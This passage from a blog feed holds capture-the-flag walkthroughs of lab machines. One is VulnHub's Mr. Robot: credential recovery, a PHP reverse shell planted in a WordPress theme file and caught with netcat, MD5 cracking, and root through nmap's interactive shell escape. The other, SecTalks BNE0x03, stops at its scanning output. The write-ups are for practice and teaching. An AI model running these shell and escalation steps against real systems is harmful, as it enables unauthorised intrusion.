</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> robots.txt available under: <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/robots.txt&quot;</span>&gt;http://10.1.1.137/robots.txt&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  <span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> Login : elliot Password : ER28-0652&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>  <span class="p">|</span> Id <span class="p">|</span> Login  <span class="p">|</span> Name <span class="p">|</span> Password  <span class="p">|</span>
</span><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span> elliot <span class="p">|</span>      <span class="p">|</span> ER28-0652 <span class="p">|</span>
</span><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Finished: Mon Aug  <span class="m">8</span> 03:11:37 2016
</span></code></pre></td></tr></table></div></figure></p>

<p>Found the password is <font color="red"><code>ER28-0652</code></font></p>

<p>However, there is another way to find out the WordPress login username and password, rather than brute force.</p>

<p>From the result of nikto scan, I noticed there is another file found <code>/license.txt</code>. By checking the source code of the file on <code>http://10.1.1.137/license.txt</code></p>

<p>I found:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;
</span><span class='line'>what you <span class="k">do</span> just pull code from Rapid9 or some s@#% since when did you become a script kitty?
</span><span class='line'>
</span><span class='line'>...truncated...
</span><span class='line'>
</span><span class='line'><span class="k">do</span> you want a password or something?
</span><span class='line'>
</span><span class='line'>...truncated...
</span><span class='line'>
</span><span class='line'><span class="nv">ZWxsaW90OkVSMjgtMDY1Mgo</span><span class="o">=</span>
</span><span class='line'>&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>By decoding the Base64 encoded string: <code>ZWxsaW90OkVSMjgtMDY1Mgo=</code>, I got a username / password <font color="red"><code>elliot:ER28-0652</code></font></p>

<p>and from nikto scan, I also noticed that the admin login page is <code>http://10.1.1.137/wp-login.php</code>.</p>

<p>So, try to login with the found username / password and succeed!.</p>

<p>Now heading to <code>Appearance</code> &ndash;> <code>Editor</code> &ndash;> <code>404.php</code> (notice here the theme is <code>twentyfifteen</code>) and replaced the content with <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s php reverse shell</a> (configured to connect back on port 443).</p>

<p>Then setup <code>NC</code> to listen on port <code>443</code>.</p>

<p>Now, by accessing the page <code>http://10.1.1.137/wp-content/themes/twentyfifteen/404.php</code> to trigger the reverse shell connect back to my attacking machine.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.137<span class="o">]</span> 47762
</span><span class='line'>Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'> 09:01:50 up <span class="m">15</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.02, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>ls -al
</span><span class='line'>total 84
</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> bin
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> boot
</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root root  <span class="m">3960</span> Aug  <span class="m">7</span>  <span class="m">2016</span> dev
</span><span class='line'>drwxr-xr-x  <span class="m">77</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span>  <span class="m">2016</span> etc
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> home
</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">33</span> Jun <span class="m">24</span>  <span class="m">2015</span> initrd.img -&gt; boot/initrd.img-3.13.0-55-generic
</span><span class='line'>drwxr-xr-x  <span class="m">16</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib64
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">2</span> root root <span class="m">16384</span> Jun <span class="m">24</span>  <span class="m">2015</span> lost+found
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> media
</span><span class='line'>drwxr-xr-x   <span class="m">4</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> mnt
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> opt
</span><span class='line'>dr-xr-xr-x <span class="m">339</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> proc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> root
</span><span class='line'>drwxr-xr-x  <span class="m">14</span> root root   <span class="m">500</span> Aug  <span class="m">7</span> 08:47 run
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> sbin
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> srv
</span><span class='line'>dr-xr-xr-x  <span class="m">13</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> sys
</span><span class='line'>drwxrwxrwt   <span class="m">5</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span> 08:49 tmp
</span><span class='line'>drwxr-xr-x  <span class="m">10</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> usr
</span><span class='line'>drwxr-xr-x  <span class="m">11</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> var
</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">30</span> Jun <span class="m">24</span>  <span class="m">2015</span> vmlinuz -&gt; boot/vmlinuz-3.13.0-55-generic
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use python to get a better shell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/home/robot
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> ..
</span><span class='line'>-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> robot robot   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-2-of-3.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> robot robot   <span class="m">39</span> Nov <span class="m">13</span>  <span class="m">2015</span> password.raw-md5
</span><span class='line'>daemon@linux:/home/robot<span class="err">$</span>
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat password.raw-md5
</span><span class='line'>cat password.raw-md5
</span><span class='line'>robot:c3fcd3d76192e4007dfb496cca67e13b
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat /etc/passwd <span class="p">|</span> grep robot
</span><span class='line'>cat /etc/passwd <span class="p">|</span> grep robot
</span><span class='line'>robot:x:1002:1002::/home/robot:
</span></code></pre></td></tr></table></div></figure></p>

<p>Found the 2nd key file <code>key-2-of-3.txt</code>, but it only can be read by user <code>robot</code></p>

<p>However, I found the username <code>robot</code> and the MD5 hash value of his password <code>c3fcd3d76192e4007dfb496cca67e13b</code> in the file <code>/home/robot/password.raw-md5</code></p>

<p>By cracking the MD5 hash, I got <code>robot</code>&rsquo;s password is <font color="red"><code>abcdefghijklmnopqrstuvwxyz</code></font></p>

<p>Also, by checking the <code>/etc/passwd</code> file, I noticed that <code>robot</code> is a system user.</p>

<p>Now I can <code>su</code> to user <code>robot</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>su robot
</span><span class='line'>su robot
</span><span class='line'>Password: abcdefghijklmnopqrstuvwxyz&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;robot@linux:~<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now, I can read the 2nd key:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:~<span class="nv">$ </span>cat key-2-of-3.txt
</span><span class='line'>cat key-2-of-3.txt
</span><span class='line'>822c73956184f694993bede3eb39f959
</span></code></pre></td></tr></table></div></figure></p>

<p>The 2nd key is <font color="red"><code>822c73956184f694993bede3eb39f959</code></font></p>

<p>Now move on to enumeration and rooting, I found there is an <a href="https://www.exploit-db.com/papers/18168/" title="NMAP --interactive priviledge escalation">old version of NMAP vulnerability</a> which can be exploited to get ROOT:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap -v
</span><span class='line'>/usr/local/bin/nmap -v&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting nmap 3.81 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.insecure.org/nmap/&quot;</span>&gt;http://www.insecure.org/nmap/&lt;/a&gt; <span class="o">)</span> at 2016-08-07 12:40 UTC
</span><span class='line'>No target machines/networks specified!
</span><span class='line'>QUITTING!
</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>ls -la /usr/local/bin/nmap
</span><span class='line'>ls -la /usr/local/bin/nmap
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">504736</span> Nov <span class="m">13</span>  <span class="m">2015</span> /usr/local/bin/nmap
</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap <span class="p">&amp;</span>ndash<span class="p">;</span>interactive
</span><span class='line'>/usr/local/bin/nmap <span class="p">&amp;</span>ndash<span class="p">;</span>interactive&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting nmap V. 3.81 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.insecure.org/nmap/&quot;</span>&gt;http://www.insecure.org/nmap/&lt;/a&gt; <span class="o">)</span>
</span><span class='line'>Welcome to Interactive Mode <span class="p">&amp;</span>ndash<span class="p">;</span> press h &lt;enter&gt; <span class="k">for</span> <span class="nb">help</span>
</span><span class='line'>nmap&gt; !sh
</span><span class='line'>!sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;id&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>robot<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;pwd&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;pwd
</span><span class='line'>/tmp&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cd /root&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd /root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;pwd&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;pwd
</span><span class='line'>/root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ls -al&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ls -al
</span><span class='line'>total 32
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">4058</span> Nov <span class="m">14</span>  <span class="m">2015</span> .bash_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root <span class="m">3274</span> Sep <span class="m">16</span>  <span class="m">2015</span> .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .cache
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root    <span class="m">0</span> Nov <span class="m">13</span>  <span class="m">2015</span> firstboot_done
</span><span class='line'>-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-3-of-3.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">140</span> Feb <span class="m">20</span>  <span class="m">2014</span> .profile
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">1024</span> Sep <span class="m">16</span>  <span class="m">2015</span> .rnd&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cat key-3-of-3.txt&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat key-3-of-3.txt
</span><span class='line'>04787ddef27c3dee1ee161b21670b4e4&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Now we got ROOT and the 3rd key is <font color="red"><code>04787ddef27c3dee1ee161b21670b4e4</code></font></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] SecTalks: BNE0x03 - Simple]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/06/08/vulnhub-sectalks-bne0x03-simple/"/>
    <updated>2016-06-08T22:07:21+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/06/08/vulnhub-sectalks-bne0x03-simple</id>
    <content type="html"><![CDATA[<p>&ldquo;Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don&rsquo;t have physical access to this machine. Therefore, tricks like editing the VM&rsquo;s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/robert-winkel,190/">Robert Winkel</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: SecTalks: BNE0x03 - Simple (<em>10.1.1.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><code>CuteNews 2.0.3</code> remote file upload vulnerability</li>
<li>Exploit overlayfs local root vulnerability to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Exploit remote file upload vunlerability to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.134  00:0c:29:29:7a:4e   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f0:91:47   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.839 seconds <span class="o">(</span>90.17 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.134</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.134/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-06-07 07:39:25 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.134 &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
